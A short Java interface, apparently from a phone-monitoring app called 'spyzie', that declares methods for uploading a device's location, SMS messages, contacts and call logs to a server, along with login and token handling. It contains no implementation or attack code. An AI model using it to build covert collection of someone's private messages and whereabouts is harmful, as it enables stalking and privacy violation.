package com.tantd.spyzie.data.network;

import com.tantd.spyzie.data.model.AccessTokenResponse;
import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.CommonResponse;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.model.Event;
import com.tantd.spyzie.data.model.Location;
import com.tantd.spyzie.data.model.LoginRequest;
import com.tantd.spyzie.data.model.Sms;

import java.util.List;

import io.reactivex.Single;

/**
 * Created by tantd on 2/26/2020.
 */
public interface ApiManager {

    Single<List<Event>> getSchedules();

    Single<AccessTokenResponse> login(LoginRequest request);

    void storeAccessToken(AccessTokenResponse accessToken);

    AccessTokenResponse getAccessToken();

    Single<CommonResponse> sendLocationData(Location location);

    Single<CommonResponse> sendLocationData(List<Location> locations);

    Single<CommonResponse> sendSmsData(Sms sms);

    Single<CommonResponse> sendSmsData(List<Sms> sms);

    Single<CommonResponse> sendContactsData(List<Contact> contacts);

    Single<CommonResponse> sendCallsData(List<Call> calls);

    Single<CommonResponse> sendExceptionTracking(Error error);

    Single<AccessTokenResponse> refreshAccessToken();
}
